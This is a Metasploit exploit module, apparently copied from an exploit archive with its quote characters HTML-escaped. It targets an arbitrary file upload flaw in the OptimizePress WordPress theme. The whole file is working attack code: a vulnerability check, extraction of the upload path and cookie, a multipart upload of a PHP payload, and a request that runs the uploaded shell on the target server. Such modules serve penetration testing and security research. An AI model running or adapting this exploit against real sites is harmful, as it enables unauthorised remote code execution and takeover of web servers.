# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;uri&#039;

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;WordPress OptimizePress Theme File Upload Vulnerability&#039;,
      &#039;Description&#039;     => %q{
        vulnerability is due to an insecure file upload on the media-upload.php component, allowing
        an attacker to upload arbitrary PHP code. This module has been tested successfully on
        OptimizePress 1.45.
      },
      &#039;Author&#039;          =>
        [
          &#039;United of Muslim Cyber Army&#039;, # Vulnerability discovery
          &#039;Mekanismen&#039; # Metasploit module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
        ],
      &#039;Privileged&#039;      => false,
      &#039;Platform&#039;        => [&#039;php&#039;],
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [ [&#039;OptimizePress&#039;, {}] ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;DisclosureDate&#039;  => &#039;Nov 29 2013&#039;
    ))

    register_advanced_options(
      [
        OptString.new(&#039;THEMEDIR&#039;, [ true, &#039;OptimizePress Theme directory&#039;, &#039;OptimizePress&#039;])
      ])
  end

  def check
    uri = target_uri.path
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(uri, &#039;wp-content&#039;, &#039;themes&#039;, datastore[&#039;THEMEDIR&#039;], &#039;lib&#039;, &#039;admin&#039;, &#039;media-upload.php&#039;)
    })

    if res and res.code == 200 and res.body.to_s =~ /Upload New Image/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    uri = normalize_uri(target_uri.path)

    #get upload filepath
    print_status("#{peer} - Getting the upload path...")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(uri, &#039;wp-content&#039;, &#039;themes&#039;, datastore[&#039;THEMEDIR&#039;], &#039;lib&#039;, &#039;admin&#039;, &#039;media-upload.php&#039;)
    })

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Unable to access vulnerable URL")
    end

    if res.body =~ /<input name="imgpath" type="hidden" id="imgpath" value="(.*)" \/>/
      file_path = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to get upload filepath")
    end

    #set cookie
    cookie = res.get_cookies

    filename = rand_text_alphanumeric(8) + ".php"

    #upload payload
    post_data = Rex::MIME::Message.new
    post_data.add_part("<?php #{payload.encoded} ?>", "application/octet-stream", nil, "form-data; name=\"newcsimg\"; filename=\"#{filename}\"")
    post_data.add_part("Upload File", nil, nil, "form-data; name=\"button\"")
    post_data.add_part("1", nil, nil, "form-data; name=\"newcsimg\"")
    post_data.add_part("#{file_path}", nil, nil, "form-data; name=\"imgpath\"")

    print_status("#{peer} - Uploading PHP payload...")

    n_data = post_data.to_s
    n_data = n_data.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;wp-content&#039;, &#039;themes&#039;, datastore[&#039;THEMEDIR&#039;], &#039;lib&#039;, &#039;admin&#039;, &#039;media-upload.php&#039;),
      &#039;ctype&#039; => &#039;multipart/form-data; boundary=&#039; + post_data.bound,
      &#039;data&#039; => n_data,
      &#039;headers&#039; => {
        &#039;Referer&#039; => "#{uri}/wp-content/themes/OptimizePress/lib/admin/media-upload.php"
      },
      &#039;cookie&#039; => cookie
    })

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Unable to upload payload")
    end

    print_good("#{peer} - Payload uploaded successfully. Disclosing the payload path...")
    #get path to payload
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(uri, &#039;wp-content&#039;, &#039;themes&#039;, datastore[&#039;THEMEDIR&#039;], &#039;lib&#039;, &#039;admin&#039;, &#039;media-upload.php&#039;)
    })

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Unable to access vulnerable URL")
    end

    payload_url = ""

    if res.body =~ /name="cs_img" value="(.*#{filename}.*)" \/> <span/
      payload_url =$1
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to deliver the payload")
    end

    begin
      u = URI(payload_url)
    rescue ::URI::InvalidURIError
      fail_with(Failure::Unknown, "#{peer} - Unable to deliver the payload, #{payload_url} isn&#039;t an URL&#039;")
    end

    register_files_for_cleanup(File::basename(u.path))

    print_good("#{peer} - Our payload is at: #{u.path}! Executing payload...")
    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => u.path
    })
  end
end

